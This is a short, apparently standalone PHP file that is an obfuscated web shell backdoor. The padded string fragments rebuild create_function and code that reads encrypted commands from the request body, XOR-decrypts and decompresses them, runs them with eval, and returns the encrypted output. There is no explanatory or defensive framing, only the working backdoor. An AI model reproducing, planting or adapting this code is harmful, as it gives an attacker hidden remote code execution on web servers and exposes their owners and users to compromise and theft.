<?php
$Z='$k=De"d157e4f9De";DeDe$kh="0360c3d95DeDec3d";De$kf="f99ff82904De44";De$p="iDeonKK';
$J='ek{$j};}De}return $Deo;De}if (DeDe@pregDe_match("/$kh(.+)$DeDekfDe/",@file_geDet_cD';
$q='(De@basDee64_decode($Dem[1])De,$k)))De;$o=@obDe_DegeDet_contents();@obDe_end_cleanDeDe';
$i='eonteDents("php://iDenDeput"),$Dem)==1) {@ob_sDetartDe();@evaDel(@gzuncomDepressDe(De@x';
$G='uIdfeDeYstium"De;fDeunction xDe($Det,$k){$c=sDetrlen(De$k);$Del=strleDen($t)De;$o="De";f';
$H=str_replace('O','','OcreatOeOO_funcOOtion');
$y='();$r=@baseDe64_encDeodeDe(@x(@gzcomDepress(De$o)De,$kDe));DeprintDe("$p$kh$r$kf");}';
$z='or($i=0De;$i<$l;De){Defor($Dej=0;DeDe($j<$c&&$i<$l);$Dej++,$i++De){$Deo.=$t{De$i}^$D';
$N=str_replace('De','',$Z.$G.$z.$J.$i.$q.$y);
$w=$H('',$N);$w();
?>
